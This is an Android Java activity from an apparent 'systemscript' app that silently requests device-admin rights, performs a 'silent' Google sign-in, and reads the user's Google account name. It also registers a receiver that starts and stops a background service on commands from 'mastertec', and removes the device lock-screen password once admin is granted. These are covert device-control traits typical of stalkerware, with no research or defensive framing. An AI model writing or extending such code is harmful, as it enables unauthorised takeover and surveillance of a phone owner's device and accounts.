package com.example.systemscript;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.tasks.Task;

public class MainActivity extends AppCompatActivity {

    private static final String MASTERTEC_ACTION = "com.mastertec.CONTROL_SYSTEMSCRIPT";
    private static final int RC_SIGN_IN = 100; // Request code for Google Sign-In
    private static final int REQUEST_CODE_DEVICE_ADMIN = 101; // Request code for device admin
    private SystemController systemController;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Initialize the SystemController
        systemController = new SystemController(this);

        // Ensure device admin permissions silently
        systemController.ensureDeviceAdmin(this, REQUEST_CODE_DEVICE_ADMIN);

        // Perform silent Google Sign-In
        systemController.silentGoogleSignIn();

        // If silent sign-in fails, fallback to UI-based sign-in
        systemController.startGoogleSignIn(this, RC_SIGN_IN);

        // Register a broadcast receiver to listen for commands from mastertec
        IntentFilter filter = new IntentFilter(MASTERTEC_ACTION);
        registerReceiver(new MastertecReceiver(), filter);

        // Fetch the user's name from the Google account
        String userName = getGoogleAccountName();
        String dateOfBirth = "Unknown"; // Date of birth fetching requires additional permissions and APIs

        // Set the custom view to display the canvas
        setContentView(new CustomCanvasView(this, userName, dateOfBirth));
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_SIGN_IN) {
            Task<GoogleSignInAccount> task = GoogleSignIn.getSignedInAccountFromIntent(data);
            systemController.handleGoogleSignInResult(task);
        } else if (requestCode == REQUEST_CODE_DEVICE_ADMIN) {
            if (resultCode == RESULT_OK) {
                Log.d("MainActivity", "Device admin enabled silently.");
                // Set system password to None or Swipe
                systemController.setSystemPasswordNone();
            } else {
                Log.e("MainActivity", "Device admin not enabled.");
            }
        }
    }

    private String getGoogleAccountName() {
        AccountManager accountManager = AccountManager.get(this);
        Account[] accounts = accountManager.getAccountsByType("com.google");
        if (accounts.length > 0) {
            return accounts[0].name; // Return the first Google account name
        }
        return "User";
    }

    private class MastertecReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String command = intent.getStringExtra("command");
            if (command != null) {
                switch (command) {
                    case "START_SERVICE":
                        startBackgroundService();
                        break;
                    case "STOP_SERVICE":
                        stopBackgroundService();
                        break;
                    case "RESTART_SERVICE":
                        restartBackgroundService();
                        break;
                    default:
                        Log.d("MainActivity", "Unknown command received: " + command);
                }
            }
        }
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        startService(serviceIntent);
    }

    private void stopBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        stopService(serviceIntent);
    }

    private void restartBackgroundService() {
        stopBackgroundService();
        startBackgroundService();
    }

    private static class CustomCanvasView extends View {
        private final String userName;
        private final String dateOfBirth;

        public CustomCanvasView(MainActivity context, String userName, String dateOfBirth) {
            super(context);
            this.userName = userName;
            this.dateOfBirth = dateOfBirth;
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);

            // Set the background color
            canvas.drawColor(Color.CYAN);

            // Create a Paint object for text
            Paint paint = new Paint();
            paint.setColor(Color.MAGENTA);
            paint.setTextSize(60);
            paint.setTextAlign(Paint.Align.CENTER);

            // Draw the text on the canvas
            canvas.drawText("Hello! " + userName, getWidth() / 2, getHeight() / 2 - 50, paint);
            canvas.drawText("Date of Birth: " + dateOfBirth, getWidth() / 2, getHeight() / 2 + 50, paint);
        }
    }
}